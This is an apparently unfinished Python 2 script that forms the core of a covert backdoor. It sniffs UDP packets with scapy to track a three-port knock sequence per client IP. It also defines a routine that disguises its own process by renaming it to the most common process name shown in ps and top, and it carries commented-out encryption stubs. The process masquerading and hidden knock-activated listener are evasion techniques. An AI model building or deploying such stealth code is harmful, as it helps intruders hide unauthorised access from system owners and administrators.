#!/usr/bin/python

import logging, setproctitle, triplesec
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from ctypes import cdll, byref, create_string_buffer

state = 0
ports = [1000, 2000, 3000]
unauthClients = {}
authedClients = {}

# def encrypt(data):
#     cipherText = triplesec.encrypt(b"string", b'* password *')
#     return cipherText

# def decrypt(data):
#     plainText = triplesec.decrypt(data, b'* password *').decode()
#     return plainText

def setProcessName(name):
    libc = cdll.LoadLibrary('libc.so.6')
    buff = create_string_buffer(len(name) + 1)
    buff.value = name
    libc.prctl(15, byref(buff), 0, 0, 0)

def maskProcess():
    command = os.popen("ps -aux | awk '{ print $11 }' | sort | uniq -c | sort -n | tail -n1 | awk '{ print $2}'")
    commandResult = command.read()
    #print "Most common process for ps/htop: {0}".format(commandResult)
    setproctitle.setproctitle(commandResult)
    command = os.popen("top -bn1 | awk '{ print $12 }' | sort | uniq -c | sort -n | tail -n1 | awk '{ print $2}'")
    commandResult = command.read()
    setProcessName(commandResult)
    #print "Most common process for top: {0}".format(commandResult)

def knock(packet):
    global state
    global ports
    global unauthClients
    if IP in packet:
        if UDP in packet:
            ip = packet[IP].src
            if ip in unauthClients.keys():
                if packet[UDP].sport == 1000 and unauthClients[ip] == 0:
                    unauthClients[ip] = 1
                    print packet[IP].src + " state 1"
                elif packet[UDP].sport == 2000 and unauthClients[ip] == 1:
                    unauthClients[ip] = 2
                    print packet[IP].src + " state 2"
                elif packet[UDP].sport == 3000 and unauthClients[ip] == 2:
                    unauthClients[ip] = 3
                    print packet[IP].src + " state 3"
                else:
                    print "You suck, state = 0"
                    print unauthClients
            else:
                if packet[UDP].sport == 1000:
                    unauthClients[ip] = 1
                    print packet[IP].src + " state 1"
                else:
                    unauthClients[ip] = 0

def main():
    sniff(filter='udp', prn=knock)

if __name__ == '__main__':
    main()
